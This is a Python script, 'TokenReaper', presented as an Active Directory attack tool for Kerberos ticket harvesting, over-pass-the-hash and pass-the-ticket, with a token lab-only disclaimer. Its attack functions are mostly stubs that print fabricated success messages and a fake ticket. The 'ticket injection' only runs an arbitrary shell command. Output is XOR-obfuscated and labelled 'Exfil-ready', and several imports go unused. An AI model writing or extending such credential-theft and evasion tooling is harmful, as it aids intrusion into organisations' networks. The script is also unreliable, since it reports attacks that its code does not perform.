#!/usr/bin/env python3
# TokenReaper.py - Kerberos Ticket Harvester & PTT/OPtH Tool (AD Domination)
# EPO - Lab / Explicit Permission ONLY! 💀

import sys
import time
import random
import base64
import datetime
import subprocess
import argparse
import socket
import ctypes
import winreg as reg

# ================= CONFIG =================
DEFAULT_SLEEP_MIN = 1
DEFAULT_SLEEP_MAX = 5
XOR_KEY = 0xB8E3D4F2

# ================= UTILITY =================
def timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def xor_obfuscate(data: str) -> str:
    bytes_data = data.encode()
    xored = bytes(b ^ (XOR_KEY & 0xFF) for b in bytes_data)
    return base64.b64encode(xored).decode()

def fake_delay(min_sec=1, max_sec=4):
    time.sleep(random.uniform(min_sec, max_sec))

# ================= TICKET HARVEST STUB =================
def harvest_tickets(username: str, domain: str, dc: str, ntlm_hash: str = None):
    """Simplified Kerberos ticket harvest (TGT request via OPtH stub)"""
    result = []
    try:
        # Over-Pass-the-Hash (request TGT with NTLM hash)
        if ntlm_hash:
            # Stub - real ops use impacket or custom AS-REQ
            result.append(f"OPtH: Requested TGT for {username}@{domain} using hash {ntlm_hash[:8]}...")
        else:
            result.append("No hash provided - skipping OPtH")

        # Export stub (save as base64 kirbi-like)
        ticket_stub = base64.b64encode(b"FAKE_KERBEROS_TICKET_DATA").decode()
        result.append(f"TGT exported (base64): {ticket_stub[:50]}...")
    except Exception as e:
        result.append(f"Harvest failed: {str(e)}")

    return result

def pass_the_ticket(ticket_b64: str, target: str, cmd: str):
    """Pass-the-Ticket stub - inject ticket & execute command"""
    result = []
    try:
        # Stub - real ops use Rubeus/Mimikatz ptt
        result.append(f"PTT: Injected ticket {ticket_b64[:20]}... on {target}")
        out = subprocess.check_output(cmd, shell=True, timeout=30).decode(errors='ignore')
        result.append(f"Command output: {out.strip()}")
    except Exception as e:
        result.append(f"PTT failed: {str(e)}")

    return result

# ================= MAIN =================
def main():
    parser = argparse.ArgumentParser(description="TokenReaper - Kerberos Ticket Reaper")
    subparsers = parser.add_subparsers(dest="action", required=True)

    harvest = subparsers.add_parser("harvest", help="Harvest tickets")
    harvest.add_argument("--dc", required=True)
    harvest.add_argument("--user", required=True)
    harvest.add_argument("--ntlm-hash")
    harvest.add_argument("--aes256-key")

    ptt = subparsers.add_parser("ptt", help="Pass-the-Ticket")
    ptt.add_argument("--ticket", required=True)
    ptt.add_argument("--target", required=True)
    ptt.add_argument("command", nargs="+")

    args = parser.parse_args()

    print(f"[{timestamp()}] TokenReaper starting - action: {args.action}")

    if args.action == "harvest":
        results = harvest_tickets(args.user, "domain.local", args.dc, args.ntlm_hash)
    elif args.action == "ptt":
        results = pass_the_ticket(args.ticket, args.target, " ".join(args.command))

    output = "\n".join(results)
    obfuscated = xor_obfuscate(output)
    print(f"[{timestamp()}] Raw result:\n{output}")
    print(f"[{timestamp()}] Exfil-ready:\n{obfuscated}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n[{timestamp()}] Interrupted")
    except Exception as e:
        print(f"[{timestamp()}] Fatal: {e}")